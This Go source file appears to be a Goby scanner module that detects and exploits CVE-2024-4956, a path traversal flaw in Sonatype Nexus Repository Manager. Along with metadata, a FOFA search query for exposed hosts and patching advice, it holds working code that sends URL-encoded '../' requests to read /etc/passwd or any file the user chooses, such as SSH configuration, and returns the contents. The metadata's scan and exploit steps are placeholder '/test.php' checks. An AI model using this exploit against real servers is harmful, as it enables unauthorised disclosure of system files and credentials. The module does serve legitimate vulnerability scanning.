package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Sonatype Nexus Repository Manager File Read Vulnerability(CVE-2024-4956)",
    "Description": "<p>Nexus Repository Manager, commonly referred to as Nexus, is a product by Sonatype. It is currently the most popular repository management software globally, offering a powerful repository manager that greatly simplifies the maintenance of internal repositories and access to external repositories.</p><p>In versions 3.0.0 to 3.68.0 of Sonatype Nexus Repository, there exists a path traversal vulnerability. An unauthenticated attacker can exploit this vulnerability by constructing malicious URLs containing sequences like \"../../../../\" to download arbitrary files from the target system, including files outside the scope of the Nexus Repository application. Successfully exploiting this vulnerability may lead to the disclosure of sensitive information such as application source code, configurations, and critical system files.</p>",
    "Product": "Sonatype-Nexus",
    "Homepage": "https://www.sonatype.com/",
    "DisclosureDate": "2024-05-23",
    "PostTime": "2024-05-23",
    "Author": "2783712916@qq.com",
    "FofaQuery": "body=\"/nexus-\" && body=\"Repository\"",
    "GobyQuery": "body=\"/nexus-\" && body=\"Repository\"",
    "Level": "3",
    "Impact": "<p>In versions 3.0.0 to 3.68.0 of Sonatype Nexus Repository, there exists a path traversal vulnerability. An unauthenticated attacker can exploit this vulnerability by constructing malicious URLs containing sequences like \"../../../../\" to download arbitrary files from the target system, including files outside the scope of the Nexus Repository application. Successfully exploiting this vulnerability may lead to the disclosure of sensitive information such as application source code, configurations, and critical system files.</p>",
    "Recommendation": "<p>1.Currently, the official recommendation is to upgrade to a secure version as soon as possible. Affected users should upgrade to the latest patched version. The download link for the secure version is: <a href=\"https://help.sonatype.com/en/download-archives---repository-manager-3.html\">https://help.sonatype.com/en/download-archives---repository-manager-3.html</a> </p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://help.sonatype.com/en/sonatype-nexus-repository-3-68-0-release-notes.html",
        "https://mp.weixin.qq.com/s/7kAEwB_FcQ2KLeiIfh0dxg",
        "https://security.snyk.io/vuln/SNYK-JAVA-ORGSONATYPENEXUS-6861919"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "/etc/passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../../../../../../../../etc/ssh/ssh_config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "Hotspot"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-4956"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Sonatype Nexus Repository Manager 文件读取漏洞（CVE-2024-4956）",
            "Product": "Sonatype-Nexus",
            "Description": "<p>Nexus全称是Nexus Repository Manager，是Sonatype公司的一个产品。它是目前世界上最流行的仓库管理软件，拥有强大的仓库管理器，极大地简化了内部仓库的维护和外部仓库的访问。</p><p>Sonatype Nexus Repository 3.0.0 - 3.68.0版本中存在路径遍历漏洞，未经身份验证的威胁者可构造../../../../这样的恶意URL下载目标系统上的任意文件，包括Nexus Repository 应用程序范围之外的系统文件，成功利用该漏洞可能导致应用程序源代码、配置和关键系统文件等敏感信息泄露。<br></p>",
            "Recommendation": "<p>1、目前，官方已发布修复建议，建议受影响的用户尽快升级至安全版本。下载地址：<a href=\"https://help.sonatype.com/en/download-archives---repository-manager-3.html\">https://help.sonatype.com/en/download-archives---repository-manager-3.html</a>&nbsp;</p><p>2、通过防火墙等安全设备设置访问策略。&nbsp;&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>Sonatype Nexus Repository 3.0.0 - 3.68.0版本中存在路径遍历漏洞，未经身份验证的威胁者可构造../../../../这样的恶意URL下载目标系统上的任意文件，包括Nexus Repository 应用程序范围之外的系统文件，成功利用该漏洞可能导致应用程序源代码、配置和关键系统文件等敏感信息泄露。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "热点"
            ]
        },
        "EN": {
            "Name": "Sonatype Nexus Repository Manager File Read Vulnerability(CVE-2024-4956)",
            "Product": "Sonatype-Nexus",
            "Description": "<p>Nexus Repository Manager, commonly referred to as Nexus, is a product by Sonatype. It is currently the most popular repository management software globally, offering a powerful repository manager that greatly simplifies the maintenance of internal repositories and access to external repositories.</p><p>In versions 3.0.0 to 3.68.0 of Sonatype Nexus Repository, there exists a path traversal vulnerability. An unauthenticated attacker can exploit this vulnerability by constructing malicious URLs containing sequences like \"../../../../\" to download arbitrary files from the target system, including files outside the scope of the Nexus Repository application. Successfully exploiting this vulnerability may lead to the disclosure of sensitive information such as application source code, configurations, and critical system files.<br></p>",
            "Recommendation": "<p>1.Currently, the official recommendation is to upgrade to a secure version as soon as possible. Affected users should upgrade to the latest patched version. The download link for the secure version is: <a href=\"https://help.sonatype.com/en/download-archives---repository-manager-3.html\">https://help.sonatype.com/en/download-archives---repository-manager-3.html</a>&nbsp;</p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In versions 3.0.0 to 3.68.0 of Sonatype Nexus Repository, there exists a path traversal vulnerability. An unauthenticated attacker can exploit this vulnerability by constructing malicious URLs containing sequences like \"../../../../\" to download arbitrary files from the target system, including files outside the scope of the Nexus Repository application. Successfully exploiting this vulnerability may lead to the disclosure of sensitive information such as application source code, configurations, and critical system files.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "Hotspot"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10952"
}`

	httpGet_fileReadXXsdw7d := func(hostInfo *httpclient.FixUrl, fileUrl string) string {
		fileUrl = strings.ReplaceAll(fileUrl, "../", "..%2f/")
		fileUrl = "/%2F%2F%2F%2F%2F%2F%2F" + fileUrl
		httpConfig := httpclient.NewGetRequestConfig(fileUrl)
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return ""
		}
		if resp.StatusCode == 200 && resp.Header.Get("Content-Type") == "application/octet-stream" {
			return resp.Utf8Html
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			vulUrl := "../../../../../../../../../../../etc/passwd"
			msg := httpGet_fileReadXXsdw7d(u, vulUrl)
			if msg == "" {
				return false
			}
			ss.VulURL = u.HostInfo + vulURL
			return true
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			mode := goutils.B2S(ss.Params["mode"])
			fileUrl := "../../../../../../../../../../../etc/passwd"
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			}
			msg := httpGet_fileReadXXsdw7d(expResult.HostInfo, fileUrl)
			if msg == "" {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = msg
			return expResult
		}))

}
